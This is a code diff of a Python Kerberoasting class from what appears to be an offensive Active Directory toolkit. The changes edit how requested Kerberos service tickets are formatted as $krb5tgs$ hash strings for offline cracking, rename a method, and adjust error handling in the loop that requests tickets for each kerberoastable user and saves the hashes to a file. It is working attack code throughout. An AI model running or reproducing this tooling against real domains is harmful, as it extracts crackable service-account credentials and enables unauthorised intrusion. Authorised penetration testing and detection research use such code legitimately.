@@ -98,36 +98,21 @@ class Kerberoasting:
             return None
 
     @staticmethod
-    def format_entry(etype, username, realm, spn, cipher_octets):
-        """Format TGS output"""
+    def format_kerberos_entry(etype, username, realm, spn, cipher_octets):
+        """ Format how the TGs should be printed """
         spn = spn.replace(":", "~")
 
-        # des_cbc_md5.value - $krb5tgs$%d$*%s$%s$%s*$%s$%s
-        # aes256_cts_hmac_sha1_96.value - $krb5tgs$%d$%s$%s$*%s*$%s$%s
-        # aes128_cts_hmac_sha1_96.value - $krb5tgs$%d$%s$%s$*%s*$%s$%s
-        # rc4_hmac.value - "$krb5tgs$%d$*%s$%s$%s*$%s$%s
-
-        if (
-            etype == constants.EncryptionTypes.rc4_hmac.value
-            or etype == constants.EncryptionTypes.des_cbc_md5.value
-        ):
+        if etype in [constants.EncryptionTypes.rc4_hmac.value, constants.EncryptionTypes.des_cbc_md5.value]:
             checksum = hexlify(cipher_octets[:16]).decode()
             data = hexlify(cipher_octets[16:]).decode()
-            entry_format = (
-                f"$krb5tgs${etype}$*{username}${realm}${spn}*${checksum}${data}"
-            )
+            entry_format = f"$krb5tgs${etype}$*{username}${realm}${realm}/{spn}*${checksum}${data}"
 
-        elif (
-            etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
-            or etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
-        ):
+        elif etype in [constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value]:
             checksum = hexlify(cipher_octets[-12:]).decode()
-            data = hexlify(cipher_octets[:-12]).decode()
-            entry_format = (
-                f"$krb5tgs${etype}${username}${realm}$*{spn}*${checksum}${data}"
-            )
+            data = hexlify(cipher_octets[:-12]).decode() 
+            entry_format = f"$krb5tgs${etype}${username}${realm}$*{realm}/{spn}*${checksum}${data}"
         else:
-            return f"[red][!][/] Unsupported encryption type: {etype}"
+            return "Unsupported encryption type"
 
         return entry_format
 
@@ -137,7 +122,7 @@ class Kerberoasting:
         enc_part = decoded_tgs["ticket"]["enc-part"]
         etype = enc_part["etype"]
         cipher_octets = enc_part["cipher"].asOctets()
-        entry = Kerberoasting.format_entry(
+        entry = Kerberoasting.format_kerberos_entry(
             etype, username, decoded_tgs["ticket"]["realm"], spn, cipher_octets
         )
 
@@ -166,17 +151,18 @@ class Kerberoasting:
         console.print(f"- [cyan]Kerberoastable Users[/]: {kerberoastable_users}", highlight=False)
 
         domain = get_domain()
-        my_username = get_username()
-        my_password = get_password()
+        username = get_username()
+        password = get_password()
 
         for user in kerberoastable_users:
             spn = user
+
             tgt, cipher, sessionKey, kdc_server = self.kerberoasting(
-                my_username, my_password, domain
+                username, password, domain
             )
 
             if not tgt:
-                console.print("[red][!][/] Unable to obtain TGT.")
+                console.print(f"[red][!][/] Unable to obtain TGT for {spn}")
                 return
 
             spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
@@ -192,5 +178,6 @@ class Kerberoasting:
 
             except Exception as error:
                 console.print(f"[red][!][/] Exception during TGS request for {spn}: {error}")
+                return
 
         console.print(f"- [cyan]Output saved in[/]: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt", highlight=False)
